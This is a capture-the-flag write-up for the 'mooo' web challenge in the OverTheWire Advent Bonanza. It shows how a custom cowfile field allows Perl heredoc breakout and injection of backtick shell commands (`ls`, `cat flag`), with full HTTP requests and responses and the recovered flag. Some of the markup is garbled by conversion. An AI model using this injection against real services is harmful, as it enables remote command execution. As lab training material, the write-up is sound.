<h1>OverTheWire Advent Bonanza â€“ mooo</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 98</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>'Moo may represent an idea, but only the cow knows.' - Mason Cooley
  settings</p>
  
  <p>Service: http://3.93.128.89:1204</p>
  
  <p>Author: semchapeu</p>
</blockquote>

<h2>Solution</h2>

<p>The website allows to use <a href="https://launchpad.net/ubuntu/bionic/amd64/cowsay/3.03+dfsg2-4">cowsay 3.03+dfsg2-4</a> command to print messages.</p>

<p>There is a functionality to create your own cowfile: <code>http://3.93.128.89:1204/cow_designer</code>.</p>

<p>Cowfiles are like <a href="https://github.com/bkendzior/cowfiles/blob/master/bearface.cow">the following</a>.</p>

<p>```perl</p>

<h1>#</h1>

<h2>acsii picture from http://www.ascii-art.de/ascii/ab/bear.txt</h2>

<h1>#</h1>

<p>$eye = chop($eyes);
$the<em>cow = &lt;<EOC;
 $thoughts
  $thoughts
     .--.              .--.
    : (\ ". _......</em> ." /) :
     '.    <code></code>    .'
      /'   _        _   <code>\\
     /     $eye}      {$eye     \\
    |       /      \\       |
    |     /'</code>\     |
     \   | .  .==.  . |   /
      '._ \.' \__/ './ _.'
      /  <code>'._-''-_.'</code>  \
EOC
```</p>

<p>Considering that you can write your own, probably that one is represented following this format and the string you pass to the cow designer functionality is appended after <code>$the_cow</code> variable.</p>

<p>You can try to modify the content of that file with a code like the following.</p>

<p><code>perl
EOCA$eyes=`ls`;print "$eyes";
</code></p>

<p>The <code>A</code> letter is a placeholder that with a proxy must be changed to `<code>\n (</code>0x0a<code>). Furthermore, due to a restriction in the functionality, you can only use variables already defined into the Perl script, like</code>$eyes`.</p>

<p>You can use the following HTTP request to enumerate the directory content.</p>

<p>```
POST /cow<em>designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow</em>designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1</p>

<p>message=message&amp;custom_cow=EOC
$eyes=<code>ls</code>;print "$eyes";&amp;eyes=ee&amp;tongue=tt</p>

<p>HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:52:30 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gbHNgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAbg.EMqHGbwtgY3BiQ9ulqMh74tdZ-Y; HttpOnly; Path=/
Content-Length: 720</p>

<p><!DOCTYPE html>
<html>
<head>
    <link href="/static/style.css" rel="stylesheet" type="text/css" />
</head></p>

<p><body>
    <h1>Mooo!</h1>
    <form action="/cow_designer" method="POST">
        Message:
        <input type="text" name="message" value="message"><br> 
        Cow:<br>
        <textarea rows="8" cols="40" name="custom_cow">
EOC
$eyes=<code>ls</code>;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type="text" name="eyes" value="ee"><br>
        Tongue:
        <input type="text" name="tongue" value="tt"><br> 
        <input type="submit" value="say">
    </form></p>

<pre><code>&lt;div&gt;&lt;pre&gt;flag
</code></pre>

<p>server.py
templates</p>

<hr />

<p>&lt; message &gt;</p>

<hr />

</pre></div>

</body>

</html>
```

And you can use the following request HTTP to print the flag file.

```
POST /cow_designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow_designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1

message=message&custom_cow=EOC
$eyes=`cat flag`;print "$eyes";&eyes=ee&tongue=tt

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:53:16 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gY2F0IGZsYWdgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAnA.U8mwtSnPeAaqSKFzmuJqy-962Xo; HttpOnly; Path=/
Content-Length: 733

<!DOCTYPE html>
<html>
<head>
    <link href="/static/style.css" rel="stylesheet" type="text/css" />
</head>

<body>
    <h1>Mooo!</h1>
    <form action="/cow_designer" method="POST">
        Message:
        <input type="text" name="message" value="message"><br> 
        Cow:<br>
        <textarea rows="8" cols="40" name="custom_cow">
EOC
$eyes=`cat flag`;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type="text" name="eyes" value="ee"><br>
        Tongue:
        <input type="text" name="tongue" value="tt"><br> 
        <input type="submit" value="say">
    </form>

<pre><code>&lt;div&gt;&lt;pre&gt;AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O} _________

<p></code></pre>
&lt; message &gt;</p>

<hr />

<p></pre></div></p>

<p></body></p>

<p></html>
```</p>

<p>The flag is the following.</p>

<p><code>
AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}
</code></p>
